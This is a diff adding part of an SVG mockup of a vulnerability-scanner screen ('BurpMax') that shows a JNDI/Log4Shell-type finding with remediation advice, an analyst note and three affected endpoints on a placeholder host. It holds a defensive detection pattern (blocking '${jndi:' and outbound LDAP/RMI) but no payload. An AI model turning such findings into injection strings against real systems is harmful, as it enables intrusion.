+    <text x="697" y="454" font-family="Courier New" font-size="11" fill="#CBD5E1">Block outbound LDAP/RMI at the network perimeter as defence-in-depth.</text>
+    <text x="697" y="470" font-family="Courier New" font-size="11" fill="#CBD5E1">Apply WAF rules blocking ${jndi: pattern at the ingress layer.</text>
+
+    <!-- ANALYST NOTE -->
+    <rect x="681" y="482" width="759" height="18" fill="#16202E"/>
+    <text x="697" y="495" font-family="Arial" font-size="10" font-weight="bold" fill="#788BA8">ANALYST NOTE</text>
+    <rect x="681" y="500" width="759" height="44" fill="#07080e"/>
+    <rect x="681" y="500" width="4"   height="44" fill="#1e283c"/>
+    <text x="697" y="516" font-family="Courier New" font-size="11" fill="#CBD5E1">Confirmed on staging 2026-05-21. OOB callback in 1.2s. PoC shared with dev team.</text>
+    <text x="697" y="532" font-family="Courier New" font-size="11" fill="#788BA8">Patch scheduled for next sprint. 3 additional endpoints also affected.</text>
+
+    <!-- AFFECTED ENDPOINTS -->
+    <rect x="681" y="544" width="759" height="18" fill="#16202E"/>
+    <text x="697" y="557" font-family="Arial" font-size="10" font-weight="bold" fill="#788BA8">AFFECTED ENDPOINTS</text>
+    <text x="1346" y="557" font-family="Arial" font-size="10" fill="#4a5568">3 endpoints</text>
+    <rect x="681" y="562" width="759" height="56" fill="#07080e"/>
+    <rect x="681" y="562" width="4"   height="56" fill="#1e283c"/>
+    <text x="697" y="578" font-family="Courier New" font-size="11" fill="#CBD5E1">POST  https://api.target.com/auth/login</text>
+    <text x="697" y="594" font-family="Courier New" font-size="11" fill="#788BA8">POST  https://api.target.com/api/v1/users</text>
+    <text x="697" y="610" font-family="Courier New" font-size="11" fill="#788BA8">GET   https://api.target.com/search</text>
+
+    <!-- ═══ STATUS BAR ═══ -->
+    <rect x="0" y="652" width="1440" height="20" fill="#0d1220"/>
+    <line x1="0" y1="652" x2="1440" y2="652" stroke="#1e283c" stroke-width="1"/>
+    <text x="16"   y="666" font-family="Arial" font-size="10" fill="#4a5568">BurpMax v1.0 | Passive + Active scanning</text>
+    <text x="1270" y="666" font-family="Arial" font-size="10" fill="#4a5568">Developed by Omkar Mirkute</text>
+
+  </g>
+</svg>
